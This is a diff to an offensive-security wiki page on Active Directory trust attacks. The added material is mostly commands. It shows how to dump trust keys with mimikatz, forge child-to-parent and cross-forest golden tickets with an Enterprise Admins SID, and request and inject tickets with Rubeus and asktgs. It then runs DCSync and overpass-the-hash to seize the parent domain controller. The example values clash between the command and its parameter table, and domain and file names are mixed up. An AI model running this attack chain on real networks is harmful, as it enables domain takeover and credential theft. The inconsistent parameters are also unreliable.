@@ -1,5 +1,5 @@
 ---
-title: Cross Forest Attacks
+title: Cross Forest / Domain Attacks
 category: Active Directory
 order: 6
 ---
@@ -14,18 +14,65 @@ How communication is made varies depending of the protocol that is being used (w
 
 When a trust is created, a trust account is created in the domain database as if it were an user (with the name finished in $). The trust key is then stored as if it was the password of the trust user (in the NT hash and Kerberos keys).
 
-# Across Forest using Trust Tickets
-
 A trust ticket is a key which a DC of the other forest uses to decrypt the TGT presented by the attacker. That is the only check. We are going to execute a similar attack such as golden ticket but using the *trust ticket* instead of the _krbtgt_ hash.
 
 To list the Trust tickets we can use mimikatz:
 
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::trust /patch"'
-Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
+```
+## Child to Parent using Trust Tickets
+
+We can escalate between domains using the trust tickets. An **inter-realm TGT** can be forged:
+
+```powershell
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:sub.corp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:05749eb179dbf3d3445e0a49d6701578 /service:krbtgt /targe
+t:corp.local /ticket:C:\temp\trust_forest_tkt.kirbi"'
+```
+* **Invoke-Mimikatz**
+
+|                   **Parameter**                   |                 **Description**                |
+|:-------------------------------------------------:|:----------------------------------------------:|
+| /domain:sub.corp.local                            | Current Domain FQDN                            |
+| /sid:S-1-5-21-268341927-4156873456-1784235843     | Current Domain SID                             |
+| /sids:S-1-5-21-280534878-1496970234-700767426-519 | SID of Enterprise Admins group (Parent Domain) |
+| /rc4:05749eb179dbf3d3445e0a49d6701578             | RC4 of the trust key (parent$)                 |
+| /user:Administrator                               | User to impersonate                            |
+| /service:krbtgt                                   | Target service in the parent domain            |
+| /target:corp.local                                | Parent Domain FQDN                             |
+| /tiket:C:\Windows\Temp\trust_tkt.kirbi            | File to store the ticket                       |
+
+
+Once we have the inter-realm TGT ticket forged we can ask for a TGS on the parent domain. We can ask a TGS for LDAP on the parent DC.
+
+* asktgs.exe (kekeo_old)
+```
+.\asktgs.exe ./trust_tkt.kirbi LDAP/corp-dc.corp.local
 ```
 
-So an inter-forest TGT can be forged:
+* Rubeus.exe
+```
+.\Rubeus.exe asktgs /ticket:trust_tkt.kirbi /dc:corp-dc.corp.local /service:LDAP/corp-dc.corp.local /ptt
+```
+
+Finally we can inject in on the current session:
+
+```powershell
+.\Rubeus.exe ptt /ticket:LDAP.mcorp-dc.moneycorp.local.kirbi
+```
+
+And execute a DCSync attack and Over-Pass-The-Hash to fully control the DC of the parent domain:
+
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\Administrator /domain:moneycorp.local"'
+.\Rubeus.exe asktgt /domain:corp.local /user:Administrator /rc4:71d04f9d50ceb1f64de7a09f23e6dc4c /dc:corp-dc.moneycorp.local /ptt
+Enter-PSSession -ComputerName corp-dc.moneycorp.local
+```
+
+## Across Forest using Trust Tickets
+
+An **inter-forest TGT** can be forged:
 
 ```powershell
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /rc4:cd3fb1b0b49c7a56d285fffdd1399231 /service:krbtgt /target:extcorp.local /ticket:C:\temp\trust_forest_tkt.kirbi"'
@@ -46,6 +93,7 @@ And inject the ticket on the current session:
 ```
 ls \\dc01.extcorp.local\share\
 ```
+# Child to Parent using krbtgt hash
 
 # Trust Abuse with MSSQL Server
 
